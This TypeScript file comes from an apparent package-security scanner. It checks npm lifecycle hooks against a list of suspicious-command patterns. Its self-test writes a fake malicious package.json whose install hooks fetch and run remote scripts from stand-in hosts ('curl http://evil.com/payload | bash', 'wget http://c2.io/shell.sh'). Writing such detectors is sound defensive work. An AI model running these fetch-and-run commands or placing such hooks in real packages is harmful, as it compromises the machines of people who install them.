/**
 * ═══════════════════════════════════════════════════════════
 *  AEGIS-AST — Script Scanner
 *  Owner: Person 2 (Security Detection Engine)
 *
 *  Scans package.json lifecycle hooks for suspicious commands.
 *  Only checks hooks that run automatically on install/uninstall.
 * ═══════════════════════════════════════════════════════════
 */

import * as fs from 'fs';
import * as path from 'path';

// Lifecycle hooks that npm runs automatically — highest attack surface
const LIFECYCLE_HOOKS = [
  'preinstall',
  'install',
  'postinstall',
  'prepare',
  'preuninstall',
  'postuninstall',
];

// Each entry: the regex to test against the command, and the label to report.
// Order matters — more specific patterns (pipe-to-shell) come before their
// component parts (bash, sh) so a single command like `curl x | bash` emits
// both "curl" and "pipe-to-shell" without double-counting "bash".
const SUSPICIOUS_PATTERNS: Array<{ pattern: RegExp; label: string }> = [
  { pattern: /\|\s*bash\b/i,        label: 'pipe-to-shell' },
  { pattern: /\|\s*sh\b/i,          label: 'pipe-to-shell' },
  { pattern: /\bcurl\b/i,           label: 'curl' },
  { pattern: /\bwget\b/i,           label: 'wget' },
  { pattern: /\bbash\b/i,           label: 'bash' },
  { pattern: /\bsh\b/i,             label: 'sh' },
  { pattern: /\bpython3\b/i,        label: 'python3' },
  { pattern: /\bpython\b/i,         label: 'python' },
  { pattern: /node\s+-e\b/i,        label: 'node-eval' },
  { pattern: /\bbase64\b/i,         label: 'base64' },
  { pattern: /\batob\s*\(/i,        label: 'atob' },
  { pattern: /\beval\s*\(/i,        label: 'eval' },
  { pattern: /\bexec\s*\(/i,        label: 'exec' },
  { pattern: /\bchild_process\b/i,  label: 'child_process' },
];

/**
 * Scans the lifecycle hooks in a package's package.json for suspicious commands.
 *
 * @param packageDir - Path to the extracted package root (must contain package.json)
 * @returns Object with `scripts` array of human-readable finding strings.
 *          Returns { scripts: [] } if package.json is missing. Never throws.
 */
export async function scanScripts(
  packageDir: string
): Promise<{ scripts: string[] }> {
  const pkgPath = path.join(packageDir, 'package.json');

  let pkg: Record<string, unknown>;
  try {
    const raw = fs.readFileSync(pkgPath, 'utf8');
    pkg = JSON.parse(raw);
  } catch {
    // Missing or unparseable package.json — nothing to scan
    return { scripts: [] };
  }

  const scripts = pkg.scripts as Record<string, string> | undefined;
  if (!scripts || typeof scripts !== 'object') {
    return { scripts: [] };
  }

  const findings: string[] = [];

  for (const hook of LIFECYCLE_HOOKS) {
    const command = scripts[hook];
    if (typeof command !== 'string') continue;

    const matchedLabels = getMatchedLabels(command);
    if (matchedLabels.length === 0) continue;

    findings.push(`${hook}: ${command} — contains ${matchedLabels.join(', ')}`);
  }

  return { scripts: findings };
}

/**
 * Returns deduplicated labels for all suspicious patterns found in a command string.
 */
function getMatchedLabels(command: string): string[] {
  const seen = new Set<string>();
  for (const { pattern, label } of SUSPICIOUS_PATTERNS) {
    if (pattern.test(command) && !seen.has(label)) {
      seen.add(label);
    }
  }
  return Array.from(seen);
}

// ─── Self-test ────────────────────────────────────────────────────────────────
// Run directly:  npx ts-node src/scanner/scripts.ts

if (require.main === module) {
  (async () => {
    const testDir = '/tmp/aegis-test';
    const pkgPath = path.join(testDir, 'package.json');

    // Create fake malicious package
    fs.mkdirSync(testDir, { recursive: true });
    fs.writeFileSync(
      pkgPath,
      JSON.stringify({
        name: 'totally-legit-pkg',
        version: '1.0.0',
        scripts: {
          preinstall:  'node -e "require(\'child_process\').exec(\'id\')"',
          postinstall: 'curl http://evil.com/payload | bash',
          install:     'echo hello',           // clean — should NOT be flagged
          prepare:     'wget http://c2.io/shell.sh && bash shell.sh',
          build:       'tsc',                  // not a lifecycle hook — should NOT appear
        },
      }, null, 2)
    );

    console.log('Running scanScripts on fake malicious package...\n');
    const result = await scanScripts(testDir);

    if (result.scripts.length === 0) {
      console.log('No findings (unexpected — check patterns)');
    } else {
      for (const finding of result.scripts) {
        console.log('  FLAGGED:', finding);
      }
    }

    // Cleanup
    fs.rmSync(testDir, { recursive: true, force: true });
    console.log('\nCleanup done.');
  })();
}
